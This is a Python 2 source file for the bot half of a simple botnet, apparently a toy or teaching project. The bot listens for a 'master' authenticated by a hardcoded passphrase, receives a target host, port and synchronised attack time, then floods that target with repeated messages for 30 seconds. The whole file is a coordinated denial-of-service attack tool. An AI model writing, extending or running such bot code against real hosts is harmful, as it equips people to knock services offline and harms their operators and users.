#!/usr/bin/env python

import socket
import time
import Util
import datetime
import thread
import threading
import signal
import sys

class Bot:
   MASTER_PASSPHRASE = 'gits#9sac'
   BOT_PASSPHRASE    = 'standalone'
   CODE_00 = '00' # send current time
   CODE_01 = '01' # send target info

   def __init__(self):
      print 'Initializing Bot...'

      signal.signal(signal.SIGINT, self.shutdown)

      # set up a socket as a server
      # used socket.gethostname() instead of localhost so that the socket
      # would be visible to the outside world
      self.botServerSocket = socket.socket()
      self.botServerSocket.setsockopt(\
         socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
      self.botServerSocket.bind((socket.gethostname(), 21800))
      self.botServerSocket.listen(1)
      print 'Bot socket created'

      # master connection
      self.master = None

      self.notAuthenticated = True

      self.target = (str(socket.gethostname()), 8080)

      # listen for master and perform authentication
      while self.notAuthenticated:
         (self.notAuthenticated, self.master) = self.listenForMaster()

      # send bot passphrase
      Util.send(self.master, self.BOT_PASSPHRASE)

      cmd = Util.recieve(self.master)
      if cmd == self.CODE_00:
         # send curr time
         currTimeStr = str(self.getCurrTime())
         Util.send(self.master, currTimeStr)

         info = Util.recieve(self.master)

         targetStr, sep, atkTime = info.partition('@')
         print info
         print targetStr
         print sep
         print atkTime


         host, sep, port = targetStr.partition(':')
         print host
         print sep
         print port

         target = (host, int(port))
         self.attack(target, atkTime)

         self.shutdown(None, None)

   """
   Listen for master and handle requests.
   """
   def listenForMaster(self):
         # blocks until client connects
         print 'Listening for Master...'
         connection, address = self.botServerSocket.accept()
         
         print 'Connected to Master: ' + str(address)

         print 'Authenticating Master...'

         recvdStr = Util.recieve(connection)

         # authenticate connection
         if recvdStr != self.MASTER_PASSPHRASE:
            # not master
            connection.close()
            print 'Stranger tried to connect!'
            return (True, None)

         # was master
         print 'Master Authenticated'

         return (False, connection)

   def attack(self, target, atkTime):

      atkTimeStr = str(datetime.datetime.fromtimestamp(\
         int(float(atkTime)/1000))) + str(int(atkTime)%1000)

      print 'Going to attack Target @ %s:%d on ' \
         % (target[0], target[1]) + atkTimeStr

      waitTimeMilSecs = long(atkTime) -  long(self.getCurrTime())

      if waitTimeMilSecs < 0:
         print 'Missed the attack :-(' 
         return

      waitTimeSecs = float(waitTimeMilSecs)/1000

      time.sleep(waitTimeSecs)

      print 'Connecting to Target @ %s:%d...' % (target[0], target[1])
      targetSocket = socket.socket()
      targetSocket.connect((target[0], target[1]))
      print 'Connected'

      startTime = time.time()
      timeout = 30
      while time.time() < startTime + timeout:
         Util.send(targetSocket, 'You\'re being attacked!!!')

      targetSocket.close()

   def getCurrTime(self):
      return int(time.time() * 1000) + 10 # time in milliseconds

   def shutdown(self, signum, frame):
      if hasattr(self, 'master') and self.master != None:
         self.master.close()

      if hasattr(self, 'botServerSocket') and self.botServerSocket != None:
         self.botServerSocket.close()

      print '\nBot socket shut down'
      print 'Bot shut down'

      sys.exit(0)

if __name__ == '__main__':
   bot = Bot()
